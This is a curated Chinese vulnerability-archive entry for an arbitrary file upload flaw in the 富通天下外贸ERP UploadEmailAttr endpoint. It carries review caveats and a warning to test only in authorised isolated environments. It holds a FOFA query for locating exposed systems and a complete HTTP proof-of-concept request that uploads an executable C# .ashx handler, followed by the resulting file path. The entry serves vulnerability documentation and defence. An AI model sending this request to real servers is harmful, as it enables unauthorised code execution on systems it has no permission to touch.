---
source: "wy876 漏洞文库"
title: "富通天下外贸ERP UploadEmailAttr上传"
product: "富通天下外贸ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本，日期/随机文件名"
prerequisites: "无Cookie，真实鉴权未知"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERP/%E5%AF%8C%E9%80%9A%E5%A4%A9%E4%B8%8B%E5%A4%96%E8%B4%B8ERPUploadEmailAttr%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "title=\"用户登录_富通天下外贸ERP\""
fofa_unverified: "title="
id: "vw-ff6fb92b1b1a4bd7a1204219"
entity_id: "ve-ff6fb92b1b1a4bd7a1204219"
schema_version: "1"
---

# 富通天下外贸ERP UploadEmailAttr上传

## 条目说明

- 对象与具体问题：富通天下外贸ERP；UploadEmailAttr上传
- 版本、配置及部署条件：无版本，日期/随机文件名
- 认证与权限前提：无Cookie，真实鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同53请求，提供日期随机路径可互补
- FOFA title=截断；未给返回字段和执行输出
- 不能把上传成功直接等同控制服务器

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
富通天下外贸ERP基于二维界面管理功能，用户可对客户进行精细化的服务和跟踪，客户基本情况、邮件往来样品寄送记录、报价记录、定金收款情况等，信息脉络化，外贸管理软件让您全方位俯瞰客户管理。该系统存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 富通天下外贸ERP

## 三、资产测绘
+ fofa`title="用户登录_富通天下外贸ERP"`
+ 特征


## 四、漏洞复现
```http
POST /JoinfApp/EMail/UploadEmailAttr?name=.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36(KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: application/x-www-form-urlencoded

<% @ webhandler language="C#" class="AverageHandler" %>
using System;
using System.Web;
public class AverageHandler : IHttpHandler
{
public bool IsReusable
{ get { return true; } }
public void ProcessRequest(HttpContext ctx)
{
ctx.Response.Write("hello");
}
}
```


文件上传位置

```plain
/JoinfWebFile/temp/emailatta/202404/20240417D636C4D1F279410CB324E1AFFE28B141.ashx
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zy1m23vzu6i6aq36>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
